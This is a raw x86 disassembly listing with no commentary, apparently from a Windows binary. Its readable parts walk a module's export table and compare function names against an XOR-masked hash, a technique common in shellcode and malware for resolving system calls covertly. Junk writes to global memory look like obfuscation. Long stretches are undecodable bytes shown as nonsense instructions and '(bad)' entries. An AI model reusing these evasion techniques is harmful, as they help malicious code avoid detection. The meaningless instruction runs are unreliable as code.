  40c4da:	mov    esi,0x7510854
  40c4df:	sub    DWORD PTR ds:0x4337bb,0x5d26
  40c4e9:	xor    eax,esi
  40c4eb:	xor    DWORD PTR ds:0x433783,0xf10
  40c4f5:	add    eax,ebx
  40c4f7:	mov    DWORD PTR ds:0x43376f,0x5b3f
  40c501:	cmp    ecx,eax
  40c503:	je     0x40cbf3
  40c509:	and    DWORD PTR ds:0x4337fb,0x10b9
  40c513:	push   DWORD PTR [ebp-0x20]
  40c516:	push   DWORD PTR [ebp+0x8]
  40c519:	sub    DWORD PTR ds:0x4337eb,0x535e
  40c523:	call   0x40f400
  40c528:	sub    DWORD PTR ds:0x4337f3,edx
  40c52e:	mov    DWORD PTR [ebp-0x14],eax
  40c531:	mov    eax,DWORD PTR [ebp-0x4]
  40c534:	mov    ecx,DWORD PTR [ebp-0x14]
  40c537:	xor    eax,esi
  40c539:	add    eax,ebx
  40c53b:	cmp    ecx,eax
  40c53d:	je     0x40cbf3
  40c543:	mov    eax,DWORD PTR [ebp-0x14]
  40c546:	mov    eax,DWORD PTR [eax+0x18]
  40c549:	mov    DWORD PTR [ebp-0x20],eax
  40c54c:	mov    eax,DWORD PTR [ebp-0x14]
  40c54f:	mov    ecx,DWORD PTR [ebp+0x8]
  40c552:	add    ecx,DWORD PTR [eax+0x20]
  40c555:	mov    DWORD PTR [ebp-0x28],ecx
  40c558:	mov    eax,DWORD PTR [ebp-0x14]
  40c55b:	mov    ecx,DWORD PTR [ebp+0x8]
  40c55e:	add    ecx,DWORD PTR [eax+0x24]
  40c561:	mov    DWORD PTR [ebp-0x2c],ecx
  40c564:	jmp    0x40c884
  40c569:	mov    ah,BYTE PTR [ecx+edx*8-0x548e0e10]
  40c570:	fs ret 
  40c572:	mov    ecx,0x40a05658
  40c577:	arpl   WORD PTR [edx],bp
  40c579:	sbb    BYTE PTR [ecx+0x7d7d7e7e],al
  40c57f:	jle    0x40c5ff
  40c581:	inc    DWORD PTR [edi+0x63]
  40c584:	cmp    BYTE PTR [eax+0x66],0x63
  40c588:	mov    al,0xaa
  40c58a:	dec    ebx
  40c58b:	jl     0x40c602
  40c58d:	scas   eax,DWORD PTR es:[edi]
  40c58e:	rcl    DWORD PTR [esi-0x56ca776],cl
  40c594:	pushf  
  40c595:	in     al,0x9f
  40c597:	xchg   edx,eax
  40c598:	and    edx,DWORD PTR [ebx]
  40c59a:	xor    al,0x6
  40c59c:	in     al,0x24
  40c59e:	add    BYTE PTR ds:[edx-0x2c],bl
  40c5a2:	in     al,dx
  40c5a3:	enter  0xecfe,0x8
  40c5a7:	(bad)  
  40c5a8:	mov    al,0xf0
  40c5aa:	stos   DWORD PTR es:[edi],eax
  40c5ab:	rcl    BYTE PTR [eax-0x1b41f557],cl
  40c5b1:	lahf   
  40c5b2:	cmp    al,0x25
  40c5b4:	mov    al,0x57
  40c5b6:	dec    esp
  40c5b7:	stos   BYTE PTR es:[edi],al
  40c5b8:	das    
  40c5b9:	pop    ss
  40c5ba:	retf   0x46f4
  40c5bd:	shr    DWORD PTR [esp+edx*4],1
  40c5c0:	sbb    al,0x2e
  40c5c2:	fild   DWORD PTR [ebx]
  40c5c4:	pop    esp
  40c5c5:	and    al,0x6e
  40c5c7:	int    0xf6
  40c5c9:	cmp    dl,BYTE PTR [esi+0x0]
  40c5cc:	cdq    
  40c5cd:	imul   ecx,DWORD PTR [eax+0x30],0x699b5a0f
  40c5d4:	je     0x40c5f4
  40c5d6:	or     bl,BYTE PTR [eax]
  40c5d8:	mov    al,0x5e
  40c5da:	adc    bh,dl
  40c5dc:	lods   eax,DWORD PTR ds:[esi]
  40c5dd:	cmc    
  40c5de:	push   ecx
  40c5df:	jge    0x40c5ee
  40c5e1:	bound  eax,QWORD PTR [esi-0x6bffa972]
  40c5e7:	aad    0x5c
  40c5e9:	and    edx,DWORD PTR [edi+esi*8-0x68]
  40c5ed:	mov    ds:0x51fcecf4,eax
  40c5f2:	inc    ebp
  40c5f3:	(bad)  
  40c5f4:	push   0xce62e308
  40c5f9:	hlt    
  40c5fa:	(bad)  
  40c5fb:	jnp    0x40c5f4
  40c5fd:	popf   
  40c5fe:	(bad)  [edx-0x2cbf21b0]
  40c604:	pop    ecx
  40c605:	mov    esi,0x716981b4
  40c60a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c60b:	cmp    DWORD PTR [ecx+0x6ed9f705],ebp
  40c611:	rol    eax,0xae
  40c614:	icebp  
  40c615:	daa    
  40c616:	pop    edx
  40c617:	jmp    0x83468d6b
  40c61c:	mov    cs,WORD PTR [eax]
  40c61e:	mov    dl,0xf
  40c620:	test   DWORD PTR [ebx+0x46],edi
  40c623:	retf   0x57e4
  40c626:	sbb    BYTE PTR [ecx-0x19],dl
  40c629:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c62a:	repz aad 0x6b
  40c62d:	adc    al,0x1e
  40c62f:	add    DWORD PTR [eax-0x45],ecx
  40c632:	icebp  
  40c633:	loopne 0x40c650
  40c635:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c636:	jp     0x3c06523e
  40c63c:	ja     0x40c605
  40c63e:	dec    esp
  40c63f:	mov    bl,bh
  40c641:	pop    edi
  40c642:	cdq    
  40c643:	jns    0x40c654
  40c645:	dec    ebx
  40c646:	push   cs
  40c647:	fmul   DWORD PTR [eax+0x2fdfb4c7]
  40c64d:	call   0xde1d:0x6a7b6e93
  40c654:	popa   
  40c655:	push   eax
  40c656:	cmp    eax,DWORD PTR [ebp-0x67]
  40c659:	sbb    cl,BYTE PTR [esi+0x17]
  40c65c:	ds jg  0x40c673
  40c65f:	inc    edx
  40c660:	xor    ebp,eax
  40c662:	(bad)
  40c665:	cmp    eax,0x3a4b5ba
  40c66a:	sbb    dh,BYTE PTR [edi+0xb]
  40c66d:	jbe    0x40c622
  40c66f:	das    
  40c670:	pop    eax
  40c671:	repnz in eax,dx
  40c673:	and    al,BYTE PTR ds:0x4fcd20f7
  40c679:	out    0xb0,al
  40c67b:	rcl    ebx,1
  40c67d:	fs cwde 
  40c67f:	icebp  
  40c680:	jns    0x40c6d5
  40c682:	(bad)  
  40c683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c684:	xchg   esp,eax
  40c685:	push   cs
  40c686:	sub    esp,0x2df253a5
  40c68c:	aad    0x23
  40c68e:	ret    0xd26
  40c691:	adc    esi,0x7265caa
  40c697:	mov    dl,0xce
  40c699:	(bad)  
  40c69b:	jo     0x40c6d4
  40c69d:	push   ebx
  40c69e:	and    al,0x71
  40c6a0:	aas    
  40c6a1:	fwait
  40c6a2:	inc    ebp
  40c6a3:	ret    0xacb
  40c6a6:	mov    cl,BYTE PTR [esi]
  40c6a8:	sahf   
  40c6a9:	fiadd  DWORD PTR [edx-0x3f66f75f]
  40c6af:	popf   
  40c6b0:	xlat   BYTE PTR ds:[ebx]
  40c6b1:	jmp    0x40c65a
  40c6b3:	jno    0x40c703
  40c6b5:	cli    
  40c6b6:	or     eax,DWORD PTR [eax+0x18]
  40c6b9:	in     al,dx
  40c6ba:	or     edx,DWORD PTR [eax-0x790288c8]
  40c6c0:	add    dh,BYTE PTR [ecx]
  40c6c2:	repnz outs dx,DWORD PTR ds:[esi]
  40c6c4:	mov    al,ds:0x437d96a7
  40c6c9:	cmp    al,0x9c
  40c6cb:	mov    al,0x20
  40c6cd:	test   eax,0xacc58c7e
  40c6d2:	pop    ebp
  40c6d3:	mov    cl,0x16
  40c6d5:	adc    al,0xf5
  40c6d7:	push   edx
  40c6d8:	mov    ebp,0x3a6c1f2d
  40c6dd:	arpl   WORD PTR [ebp-0x15],dx
  40c6e0:	jmp    0x7348eddc
  40c6e5:	ret    
  40c6e6:	mov    bh,0xbe
  40c6e8:	mov    esp,0x89a6cadb
  40c6ed:	fs ja  0x40c739
  40c6f0:	fincstp 
  40c6f2:	test   eax,0xfdeb93f4
  40c6f7:	fistp  WORD PTR [ebp+0x61]
  40c6fa:	jmp    0x40c6c7
  40c6fc:	mov    ebp,ecx
  40c6fe:	xchg   edi,eax
  40c6ff:	cwde   
  40c700:	pop    edx
  40c701:	outs   dx,BYTE PTR ds:[esi]
  40c702:	push   eax
  40c703:	jecxz  0x40c783
  40c705:	jmp    0xaecd7d4f
  40c70a:	std    
  40c70b:	out    0xdd,eax
  40c70d:	jge    0x40c784
  40c70f:	(bad)  
  40c711:	into   
  40c712:	pop    esi
  40c713:	pop    ebp
  40c714:	jno    0x40c6ce
  40c716:	and    eax,0x5c17fda2
  40c71b:	adc    DWORD PTR [esi-0x52],ebx
  40c71e:	jle    0x40c74c
  40c720:	inc    ebp
  40c721:	mov    edx,DWORD PTR [eax+0x3a]
  40c724:	cdq    
  40c725:	call   0xab7a5d16
  40c72a:	push   DWORD PTR [eax+0x1e]
  40c72d:	sub    al,0xd3
  40c72f:	xchg   edx,eax
  40c730:	stc    
  40c731:	mov    edi,0x8a6f04c4
  40c736:	sahf   
  40c737:	xor    eax,ecx
  40c739:	sbb    dh,bl
  40c73b:	mov    ?,WORD PTR [ecx]
  40c73d:	bound  ebp,QWORD PTR [ebp-0x42]
  40c740:	pushf  
  40c741:	dec    DWORD PTR [edi+ebx*1-0x2edbf7c3]
  40c748:	rdmsr  
  40c74a:	(bad)  
  40c74b:	lods   eax,DWORD PTR ds:[esi]
  40c74c:	cli    
  40c74d:	add    dl,ch
  40c74f:	mov    ds:0x9cca8291,eax
  40c754:	add    eax,0xae48c9c5
  40c759:	out    dx,eax
  40c75a:	pop    edx
  40c75b:	call   0x81cba8f9
  40c760:	or     cl,BYTE PTR [ebp-0x5b794506]
  40c766:	mov    edx,0x4c4f87da
  40c76b:	enter  0x52e2,0xb6
  40c76f:	sbb    eax,0x4c3179af
  40c774:	push   es
  40c775:	mov    BYTE PTR [ebx],cl
  40c777:	out    0x2a,eax
  40c779:	adc    al,0xf4
  40c77b:	jmp    0x30fa:0xc4e87aa2
  40c782:	bnd jmp 0x81365db6
  40c788:	xchg   edx,eax
  40c789:	adc    ch,cl
  40c78b:	lods   al,BYTE PTR ds:[esi]
  40c78c:	sub    ecx,DWORD PTR [eax+0x1fb3bb23]
  40c792:	test   DWORD PTR [ebx+0x10],edi
  40c795:	push   esi
  40c796:	(bad)  
  40c797:	pop    ss
  40c798:	and    ch,dl
  40c79a:	fcomp  DWORD PTR [edx+0x76]
  40c79d:	mov    bl,0xe5
  40c79f:	sub    dl,ch
  40c7a1:	inc    edi
  40c7a2:	aaa    
  40c7a3:	fs nop
  40c7a5:	outs   dx,BYTE PTR cs:[esi]
  40c7a7:	adc    eax,0x36e0af35
  40c7ac:	push   edx
  40c7ad:	mov    ebp,0x6d49bc76
  40c7b2:	js     0x40c825
  40c7b4:	repz (bad) 
  40c7b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7b7:	stos   BYTE PTR es:[edi],al
  40c7b8:	lahf   
  40c7b9:	sub    al,0x2d
  40c7bb:	mov    dh,0x47
  40c7bd:	mov    esp,0x6f1bc4a8
  40c7c2:	(bad)  
  40c7c3:	lahf   
  40c7c4:	pushf  
  40c7c5:	add    BYTE PTR [ecx+ecx*2-0x2],dl
  40c7c9:	xor    dl,BYTE PTR [edx-0x3]
  40c7cc:	sbb    al,0xc7
  40c7ce:	mov    ebx,0x5946dede
  40c7d3:	xor    eax,0xf1e4b8a4
  40c7d8:	add    al,0x81
  40c7da:	popa   
  40c7db:	mov    WORD PTR [ecx+0x73],cs
  40c7de:	fcom   QWORD PTR [ebx+ebx*1-0x54]
  40c7e2:	xor    al,0xec
  40c7e4:	scas   eax,DWORD PTR es:[edi]
  40c7e5:	stc    
  40c7e6:	and    dl,bh
  40c7e8:	mov    al,0x35
  40c7ea:	add    ch,BYTE PTR [esi]
  40c7ec:	pop    ecx
  40c7ed:	xchg   edx,eax
  40c7ee:	aas    
  40c7ef:	dec    esi
  40c7f0:	sti    
  40c7f1:	add    eax,0x8daea93c
  40c7f6:	jae    0x40c814
  40c7f8:	or     DWORD PTR [ecx-0xb],eax
  40c7fb:	push   0xffffffc5
  40c7fd:	xchg   ebx,eax
  40c7fe:	mov    al,0x61
  40c800:	lods   al,BYTE PTR ds:[esi]
  40c801:	dec    esp
  40c802:	call   0x13cf7cd8
  40c807:	mov    ebp,0xe0210057
  40c80c:	lds    edx,FWORD PTR [ebx-0x50]
  40c80f:	(bad)
  40c813:	or     al,0x8b
  40c815:	stc    
  40c816:	xchg   ebp,eax
  40c817:	lahf   
  40c818:	loop   0x40c7bd
  40c81a:	clc    
  40c81b:	sub    BYTE PTR [ebp-0x7d],0x72
  40c81f:	mov    al,ds:0xbf1b648e
  40c824:	aam    0x60
  40c826:	adc    edx,esi
  40c828:	mov    ebx,0xf490b659
  40c82d:	mov    al,0x4c
  40c82f:	mov    bl,0x12
  40c831:	aaa    
  40c832:	data16 mov ch,0x2
  40c835:	mov    ecx,0x7f8de56f
  40c83a:	mov    bh,0x5c
  40c83c:	aad    0xbe
  40c83e:	cmp    BYTE PTR [edx],bh
  40c840:	scas   eax,DWORD PTR es:[edi]
  40c841:	jge    0x40c82e
  40c843:	bswap  eax
  40c845:	or     al,BYTE PTR [ebx]
  40c847:	ror    ebx,1
  40c849:	not    BYTE PTR [edx]
  40c84b:	jnp    0x40c86d
  40c84d:	xlat   BYTE PTR ds:[ebx]
  40c84e:	psadbw mm1,QWORD PTR [ecx+0x1e]
  40c852:	inc    ebx
  40c853:	pusha  
  40c854:	jno    0x40c7f1
  40c856:	(bad)  
  40c857:	mov    cl,0x63
  40c859:	je     0x40c8c3
  40c85b:	leave  
  40c85c:	push   esp
  40c85d:	mov    ecx,0x3593c9b7
  40c862:	les    esp,FWORD PTR [ecx+0x3eb1caa1]
  40c868:	dec    edx
  40c869:	mov    cl,0x22
  40c86b:	add    dh,BYTE PTR [esi+0x20]
  40c86e:	push   edx
  40c86f:	xor    ebp,DWORD PTR [ecx-0x7bf3c7f]
  40c875:	lods   al,BYTE PTR ds:[esi]
  40c876:	adc    BYTE PTR ds:0x78647f2c,bl
  40c87c:	xor    al,0x36
  40c87e:	rcl    DWORD PTR [eax],0x40
  40c881:	xchg   esi,eax
  40c882:	mov    ds:0xec458b58,al
  40c887:	mov    ecx,DWORD PTR [ebp+0x8]
  40c88a:	add    ecx,DWORD PTR [eax+0x1c]
  40c88d:	xor    esi,esi
  40c88f:	mov    DWORD PTR [ebp-0x14],ecx
  40c892:	mov    eax,DWORD PTR [ebp-0x28]
  40c895:	mov    ecx,DWORD PTR [ebp+0x8]
  40c898:	add    ecx,DWORD PTR [eax+edi*4]
  40c89b:	lea    eax,[ebp-0x8]
  40c89e:	mov    DWORD PTR [ebp-0x30],ecx
  40c8a1:	jmp    0x40cbc1
  40c8a6:	push   0xffffffa4
  40c8a8:	adc    ebx,DWORD PTR [ecx]
  40c8aa:	shr    DWORD PTR [ecx+0x51917570],1
  40c8b0:	cs fwait
  40c8b2:	sbb    al,0xea
  40c8b4:	int3   
  40c8b5:	xor    BYTE PTR [edi],ah
  40c8b7:	mov    WORD PTR [esi+0x7e],?
  40c8ba:	jge    0x40c939
  40c8bc:	jle    0x40c93c
  40c8be:	push   0xffffffc8
  40c8c0:	push   ebx
  40c8c1:	jbe    0x40c8c1
  40c8c3:	sub    dl,BYTE PTR [eax+0x7a4c267b]
  40c8c9:	jno    0x40c8e1
  40c8cb:	jbe    0x40c8c6
  40c8cd:	mov    fs,WORD PTR [eax]
  40c8cf:	sti    
  40c8d0:	jb     0x40c86e
  40c8d2:	sbb    ah,cl
  40c8d4:	fwait
  40c8d5:	xor    eax,0x7d92b1c5
  40c8da:	popa   
  40c8db:	adc    ah,ah
  40c8dd:	jne    0x40c888
  40c8df:	jne    0x40c8d3
  40c8e1:	clc    
  40c8e2:	std    
  40c8e3:	inc    edi
  40c8e4:	rdtsc  
  40c8e6:	nop    edx
  40c8e9:	gs ret 
  40c8eb:	test   al,0xed
  40c8ed:	and    eax,0x5a08506b
  40c8f2:	lds    edi,FWORD PTR [eax]
  40c8f4:	sti    
  40c8f5:	daa    
  40c8f6:	outs   dx,DWORD PTR ds:[esi]
  40c8f7:	fsubr  DWORD PTR [esi+0x2f2f7d8e]
  40c8fd:	(bad)
  40c900:	or     DWORD PTR [ebp+eiz*4-0x6cd56b79],0x4b1cf3c2
  40c90b:	addr16 push esp
  40c90d:	imul   esi,DWORD PTR [edi-0x2df0b8f2],0xffffff88
  40c914:	add    ch,BYTE PTR [eax+eax*4-0x56dc2af1]
  40c91b:	aam    0x54
  40c91d:	jmp    0x43b5916f
  40c922:	inc    edx
  40c923:	popa   
  40c924:	dec    ebp
  40c925:	ins    BYTE PTR es:[edi],dx
  40c926:	and    eax,0x3b7be82f
  40c92b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c92c:	adc    eax,0xfb1df441
  40c931:	or     dh,BYTE PTR [ecx-0x467a73ef]
  40c937:	sbb    BYTE PTR [ebp+0x53],al
  40c93a:	js     0x40c97c
  40c93c:	mov    bh,0x16
  40c93e:	popa   
  40c93f:	mov    ah,dl
  40c941:	mov    ds:0xf09d2210,ax
  40c947:	ret    
  40c948:	sub    dl,BYTE PTR [ebp+0x616624de]
  40c94e:	fs mov eax,0xfa404a9a
  40c954:	nop
  40c955:	mov    eax,ds:0xb05faba9
  40c95a:	mov    edi,0x2bead713
  40c95f:	and    esi,DWORD PTR [edi+0x48d8708a]
  40c965:	cmp    al,0x79
  40c967:	xlat   BYTE PTR ds:[ebx]
  40c968:	dec    esp
  40c969:	out    0x98,eax
  40c96b:	pop    ss
  40c96c:	mov    ecx,0x80e4e58
  40c971:	sar    ch,0xe4
  40c974:	call   0x4ccc1ecc
  40c979:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c97a:	adc    eax,0x8870aa61
  40c97f:	ja     0x40c9ff
  40c981:	push   0xffffffd1
  40c983:	mov    ah,0xf9
  40c985:	out    0x63,eax
  40c987:	out    0xf6,eax
  40c989:	adc    eax,0x972932b7
  40c98e:	mov    edi,0x76b6f83d
  40c993:	mov    eax,ds:0xeb307b36
  40c998:	idiv   BYTE PTR [edi]
  40c99a:	xor    eax,0xc4dba9ad
  40c99f:	pop    eax
  40c9a0:	inc    edi
  40c9a1:	test   BYTE PTR [ebx-0x23],bh
  40c9a4:	pop    ebp
  40c9a5:	push   edx
  40c9a6:	mov    edx,0xc320390e
  40c9ab:	pop    ebx
  40c9ac:	xchg   bh,bl
  40c9ae:	dec    esi
  40c9af:	ret    
  40c9b0:	push   ds
  40c9b1:	pop    esp
  40c9b2:	hlt    
  40c9b3:	adc    esi,eax
  40c9b5:	inc    edi
  40c9b6:	push   ebp
  40c9b7:	pop    esp
  40c9b8:	cld    
  40c9b9:	fwait
  40c9ba:	add    esp,ebx
  40c9bc:	mov    bl,0x3c
  40c9be:	cmp    eax,0xedd25808
  40c9c3:	aam    0x2d
  40c9c5:	addr16 fwait
  40c9c7:	push   cs
  40c9c8:	clc    
  40c9c9:	xlat   BYTE PTR ds:[ebx]
  40c9ca:	aas    
  40c9cb:	xchg   edi,eax
  40c9cc:	out    dx,eax
  40c9cd:	int3   
  40c9ce:	js     0x40c9d5
  40c9d0:	xor    BYTE PTR [edx+0x40],dh
  40c9d3:	(bad)  
  40c9d4:	jo     0x40ca02
  40c9d6:	jp     0x40c9d0
  40c9d8:	push   ebx
  40c9d9:	push   ebp
  40c9da:	(bad)  
  40c9db:	pusha  
  40c9dc:	cmp    DWORD PTR [edi-0x76],ebp
  40c9df:	jp     0x40c99d
  40c9e1:	mov    esp,0x524b667d
  40c9e6:	pop    edi
  40c9e7:	cmc    
  40c9e8:	or     al,0x2d
  40c9ea:	mov    al,ds:0xb0083144
  40c9ef:	shl    DWORD PTR [ebp+0x6b03e915],0x58
  40c9f6:	xchg   DWORD PTR ds:0x840de11b,esp
  40c9fc:	test   al,0x76
  40c9fe:	jg     0x40c981
  40ca00:	sub    bl,bl
  40ca02:	inc    esi
  40ca03:	sar    BYTE PTR [esi+edx*8-0x1e4d7e34],0xac
  40ca0b:	jbe    0x40c9cd
  40ca0d:	test   DWORD PTR [edx-0x36],eax
  40ca10:	dec    edx
  40ca11:	push   ebp
  40ca12:	fldcw  WORD PTR [esi]
  40ca14:	jg     0x40ca09
  40ca16:	(bad)  
  40ca17:	ins    BYTE PTR es:[edi],dx
  40ca18:	or     ebp,DWORD PTR [eax]
  40ca1a:	sar    DWORD PTR [eax+ebx*1+0x11d7cbb8],1
  40ca21:	pop    esi
  40ca22:	ins    DWORD PTR es:[edi],dx
  40ca23:	outs   dx,BYTE PTR ds:[esi]
  40ca24:	stos   DWORD PTR es:[edi],eax
  40ca25:	mov    bl,0x88
  40ca27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca28:	popa   
  40ca29:	sub    eax,ebp
  40ca2b:	jmp    ebp
  40ca2d:	fst    st(3)
  40ca2f:	pusha  
  40ca30:	nop
  40ca31:	aas    
  40ca32:	jns    0x40ca68
  40ca34:	xor    al,al
  40ca36:	xchg   ebp,eax
  40ca37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca38:	ficomp WORD PTR [ecx]
  40ca3a:	(bad)  
  40ca3b:	xlat   BYTE PTR ds:[ebx]
  40ca3c:	adc    ebx,DWORD PTR [eax+0x33]
  40ca3f:	fcomip st,st(4)
  40ca41:	loopne 0x40c9c8
  40ca43:	lea    eax,[esi-0x32]
  40ca46:	xlat   BYTE PTR fs:[ebx]
  40ca48:	int3   
  40ca49:	lods   eax,DWORD PTR ds:[esi]
  40ca4a:	pusha  
  40ca4b:	mov    ds:0xd617575c,al
  40ca50:	popa   
  40ca51:	pcmpeqd mm3,QWORD PTR [ecx]
  40ca54:	adc    DWORD PTR [ebp-0x49],ebx
  40ca57:	sub    eax,0x16f7a8b3
  40ca5c:	dec    ebx
  40ca5d:	sub    al,0xbe
  40ca5f:	add    ch,BYTE PTR [eax-0x35]
  40ca62:	aad    0x28
  40ca64:	add    BYTE PTR [eax],dl
  40ca66:	and    edi,esp
  40ca68:	lods   al,BYTE PTR ds:[esi]
  40ca69:	mov    edi,0xdf2496ff
  40ca6e:	cmp    eax,0x48267ab3
  40ca73:	mov    bh,0x75
  40ca75:	xchg   edi,eax
  40ca76:	xchg   esp,eax
  40ca77:	leave  
  40ca78:	xchg   ecx,eax
  40ca79:	mov    esp,ss
  40ca7b:	out    dx,eax
  40ca7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca7d:	inc    esi
  40ca7e:	out    dx,al
  40ca7f:	inc    eax
  40ca80:	scas   al,BYTE PTR es:[edi]
  40ca81:	jmp    0x8dde:0x8eeb4733
  40ca88:	ins    DWORD PTR es:[edi],dx
  40ca89:	push   ecx
  40ca8a:	rcr    DWORD PTR [ecx],cl
  40ca8c:	std    
  40ca8d:	mov    al,0x56
  40ca8f:	je     0x40ca5b
  40ca91:	sub    al,0x45
  40ca93:	std    
  40ca94:	adc    ch,ah
  40ca96:	dec    eax
  40ca97:	push   eax
  40ca98:	pop    esp
  40ca99:	xchg   edx,eax
  40ca9a:	fist   DWORD PTR [eax-0x33c0cfb5]
  40caa0:	rcl    BYTE PTR [edx],cl
  40caa2:	(bad)  
  40caa3:	(bad)  [ebp-0x19]
  40caa6:	add    bh,ah
  40caa8:	mov    ds:0xe5a42346,eax
  40caad:	pop    ebx
  40caae:	std    
  40caaf:	pop    ds
  40cab0:	lods   eax,DWORD PTR ds:[esi]
  40cab1:	push   edx
  40cab2:	mov    edx,ss
  40cab4:	and    DWORD PTR [edx-0x10dfcc9a],edx
  40caba:	sub    esi,DWORD PTR [edx-0x2e]
  40cabd:	fild   WORD PTR [edi-0x63b1a795]
  40cac3:	idiv   DWORD PTR [eax+0x541d07]
  40cac9:	mov    ebp,0xc92bafd3
  40cace:	call   DWORD PTR [ebx]
  40cad0:	add    eax,0x23b873fc
  40cad5:	(bad)  
  40cad7:	je     0x40cb0f
  40cad9:	mov    al,0xb0
  40cadb:	shr    BYTE PTR [esi-0x2e865460],0x67
  40cae2:	test   BYTE PTR [edi+edi*1-0xa],ah
  40cae6:	out    0x43,al
  40cae8:	popa   
  40cae9:	mov    ss,WORD PTR [esi+0x2f]
  40caec:	adc    eax,0x607ef315
  40caf1:	outs   dx,BYTE PTR ds:[esi]
  40caf2:	pop    es
  40caf3:	outs   dx,DWORD PTR ds:[esi]
  40caf4:	repnz mov dl,0x77
  40caf7:	dec    ecx
  40caf8:	mov    al,0x65
  40cafa:	jl     0x40cb2f
  40cafc:	sbb    eax,0xcf7c5124
  40cb01:	push   cs
  40cb02:	cmc    
  40cb03:	dec    ebx
  40cb04:	jno    0x40cae2
  40cb06:	lahf   
  40cb07:	mov    edi,0x9a64d0a7
  40cb0c:	xor    esi,DWORD PTR [ebx+0x76fba8ae]
  40cb12:	xchg   BYTE PTR [edx+edx*2-0x31a81aaf],dl
  40cb19:	add    eax,0x2194fa4a
  40cb1e:	(bad)  
  40cb1f:	xchg   esp,eax
  40cb20:	xor    BYTE PTR [edx-0x4a],ah
  40cb23:	push   esp
  40cb24:	not    DWORD PTR [edx]
  40cb26:	arpl   WORD PTR [ecx+0x18],si
  40cb29:	xor    DWORD PTR [edi-0x37],0x99e9286e
  40cb30:	clc    
  40cb31:	adc    bh,ah
  40cb33:	push   edx
  40cb34:	xor    DWORD PTR [ebp-0x290fe9ae],edi
  40cb3a:	dec    esp
  40cb3b:	dec    esi
  40cb3c:	mov    al,BYTE PTR [eax+esi*1+0x5a]
  40cb40:	repz and eax,0xc2154f23
  40cb46:	sbb    BYTE PTR [ebp+0x62],dh
  40cb49:	inc    DWORD PTR [eax-0x6b]
  40cb4c:	pop    ebx
  40cb4d:	imul   esp,DWORD PTR [esi-0x26],0x2c
  40cb51:	icebp  
  40cb52:	push   ebx
  40cb53:	jmp    0xa22a4ccc
  40cb58:	push   ss
  40cb59:	iret   
  40cb5a:	xchg   esi,eax
  40cb5b:	enter  0xd805,0x0
  40cb5f:	cld    
  40cb60:	sar    DWORD PTR [ebx-0x66ee8e50],0x27
  40cb67:	sub    ecx,DWORD PTR ds:[esp+ecx*2]
  40cb6b:	scas   eax,DWORD PTR es:[edi]
  40cb6c:	jle    0x40cb22
  40cb6e:	fiadd  WORD PTR [edx+0x964dd53]
  40cb74:	pop    ebp
  40cb75:	rcr    BYTE PTR [ecx+0x4e],0xb3
  40cb79:	enter  0xfc6,0xce
  40cb7d:	push   ecx
  40cb7e:	dec    edi
  40cb7f:	dec    BYTE PTR [edx-0x14bb78d0]
  40cb85:	ins    DWORD PTR es:[edi],dx
  40cb86:	pop    ss
  40cb87:	addr16 call 0xca3a:0x8bb27e43
  40cb8f:	mov    ecx,0x2a40bc83
  40cb94:	jns    0x40cb87
  40cb96:	xor    BYTE PTR [ecx+0x79],ch
  40cb99:	cdq    
  40cb9a:	shl    BYTE PTR [esi],cl
  40cb9c:	xchg   BYTE PTR [ecx+0x68e827db],dh
  40cba2:	xor    DWORD PTR [esp+esi*2-0x534910e6],edi
  40cba9:	or     al,0xcc
  40cbab:	gs pushf 
  40cbad:	push   ds
  40cbae:	sbb    ebp,DWORD PTR [esi-0x7ba05e9e]
  40cbb4:	in     eax,0x6b
  40cbb6:	add    DWORD PTR [esp+ebp*4-0x5226b7d0],eax
  40cbbd:	repz cmc 
  40cbbf:	add    ah,cl
  40cbc1:	push   eax
  40cbc2:	push   DWORD PTR [ebp-0x30]
  40cbc5:	push   DWORD PTR [ebp+0xc]
  40cbc8:	call   0x410a7f
  40cbcd:	mov    eax,DWORD PTR [ebp-0x4]
  40cbd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40cbd3:	xor    eax,0x7510854
  40cbd8:	add    eax,ebx
  40cbda:	cmp    ecx,eax
  40cbdc:	jne    0x40cbff
  40cbe2:	mov    eax,DWORD PTR [ebp-0x20]
  40cbe5:	inc    edi
  40cbe6:	cmp    edi,eax
  40cbe8:	jb     0x40c413
  40cbee:	jmp    0x40cc0f
  40cbf3:	mov    eax,DWORD PTR [ebp-0x4]
  40cbf6:	xor    eax,esi
  40cbf8:	add    eax,ebx
  40cbfa:	jmp    0x40e33d
  40cbff:	mov    eax,DWORD PTR [ebp-0x2c]
  40cc02:	movzx  eax,WORD PTR [eax+edi*2]
  40cc06:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc09:	mov    eax,DWORD PTR [ecx+eax*4]
  40cc0c:	mov    DWORD PTR [ebp+0xc],eax
  40cc0f:	mov    eax,DWORD PTR [ebp-0x4]
  40cc12:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc15:	xor    eax,0x7510854
  40cc1a:	add    eax,ebx
  40cc1c:	cmp    ecx,eax
  40cc1e:	jne    0x40cf51
  40cc24:	mov    eax,DWORD PTR [ebp-0x4]
  40cc27:	xor    eax,0x7510854
  40cc2c:	jmp    0x40cbf8
  40cc31:	jmp    0x40cf51
  40cc36:	xchg   BYTE PTR [edi-0x6ff40385],dl
  40cc3c:	adc    DWORD PTR [ebp+0x593a5a78],0x2f91cb4c
  40cc46:	and    cl,BYTE PTR [ebx+0x7d7d7e7e]
  40cc4c:	jle    0x40cccc
  40cc4e:	push   ebx
  40cc4f:	or     ebp,edx
  40cc51:	stc    
  40cc52:	sub    al,0x75
  40cc54:	and    bl,BYTE PTR [edi+0x12]
  40cc57:	aam    0xa5
  40cc59:	mov    DWORD PTR [edi+0x5a4ea4a4],edx
  40cc5f:	in     eax,dx
  40cc60:	push   edx
  40cc61:	xchg   BYTE PTR [eax],ch
  40cc63:	out    dx,al
  40cc64:	popa   
  40cc65:	(bad)  
  40cc66:	xchg   ebx,eax
  40cc67:	int    0x79
